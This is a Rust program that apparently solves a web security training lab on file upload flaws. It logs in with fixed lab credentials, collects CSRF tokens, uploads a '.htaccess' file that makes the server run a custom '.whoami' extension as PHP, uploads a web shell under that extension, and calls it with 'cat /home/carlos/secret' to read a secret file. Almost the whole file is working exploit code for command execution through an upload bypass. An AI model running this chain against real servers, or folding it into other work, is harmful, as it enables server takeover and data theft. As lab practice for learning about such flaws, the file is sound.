use file_upload_vulnerabilities::{
    HTTP_CLIENT as client, LOGIN_CSRF_TOKEN_SELECTOR, MY_AVATAR_UPLOAD_CSRF_TOKEN_SELECTOR,
    PASSWORD, USERNAME, WEBSHELL, generate_clap_parser, get_csrf_token, get_flag,
};
use reqwest::blocking::{
    Response,
    multipart::{Form, Part},
};
use std::time::{Duration, Instant};

fn main() {
    let start_time: Instant = Instant::now();

    let args = generate_clap_parser();
    let lab_url = args.lab_url.as_str().trim_end_matches("/");

    // Making a GET request to the given url
    let response: Response = client
        .get(format!("{}/login", lab_url))
        .send()
        .expect("[-] Failed to make the GET request");

    // Extracting the body from the response
    let body: String = response.text().expect("[-] Failed to read response text");

    // Getting the CSRF token for the /login page
    let login_page_csrf_token: String = get_csrf_token(&body, &LOGIN_CSRF_TOKEN_SELECTOR);
    println!("[+] Login CSRF Token: {}", login_page_csrf_token);

    // Generating the login form data
    let data = [
        ("username", USERNAME),
        ("password", PASSWORD),
        ("csrf", &login_page_csrf_token),
    ];

    // Logging in as the given user. This request responds with the /my-account?id=wiener page
    let response: Response = client
        .post(format!("{}/login", lab_url))
        .form(&data)
        .send()
        .expect("[-] Failed to login as the given user");

    // Extracting the body from the response
    let body: String = response.text().expect("[-] Failed to read response text");

    // Getting the CSRF token from the /my-account?id=wiener page for the uploading avatar
    let my_avatar_upload_csrf_token: String =
        get_csrf_token(&body, &MY_AVATAR_UPLOAD_CSRF_TOKEN_SELECTOR);
    println!(
        "[+] My Avatar Upload CSRF Token: {}",
        &my_avatar_upload_csrf_token
    );

    // Generating the .htaccess payload
    // Use any extension that you would like to execute considering it as a PHP file
    let payload: Part = Part::bytes(b"AddType application/x-httpd-php .whoami")
        .file_name(".htaccess")
        .mime_str("text/plain")
        .expect("[-] Failed to generate payload");

    // Generating avatar upload multipart form data
    let form: Form = Form::new()
        .text("user", USERNAME)
        .text("csrf", my_avatar_upload_csrf_token.clone())
        .part("avatar", payload);

    // Uploading the .htaccess file to override permissions
    client
        .post(format!("{}/my-account/avatar", lab_url))
        .multipart(form)
        .send()
        .expect("[-] Failed to upload the .htaccess payload");

    // Generating the web shell payload to upload
    let payload: Part = Part::bytes(WEBSHELL.as_bytes())
        .file_name("web-shell.whoami")
        .mime_str("application/x-php")
        .expect("[-] Failed to generate payload");

    // Generating avatar upload multipart form data
    let form: Form = Form::new()
        .text("user", USERNAME)
        .text("csrf", my_avatar_upload_csrf_token)
        .part("avatar", payload);

    // Uploading the Payload
    let response: Response = client
        .post(format!("{}/my-account/avatar", lab_url))
        .multipart(form)
        .send()
        .expect("[-] Failed to upload the payload");

    // If payload upload successful
    if response.status() == 200 {
        // Trying to read the secret
        let response: Response = client
            .get(format!(
                "{}/files/avatars/web-shell.whoami?command=cat /home/carlos/secret",
                lab_url
            ))
            .send()
            .expect("[-] Failed to get secret");

        if response.status() == 200 {
            get_flag(response.text().expect("[-] Failed to read secret"));
        }
    }

    let total_time: Duration = Instant::elapsed(&start_time);
    println!("[+] Total time taken: {}", total_time.as_secs_f64());
}
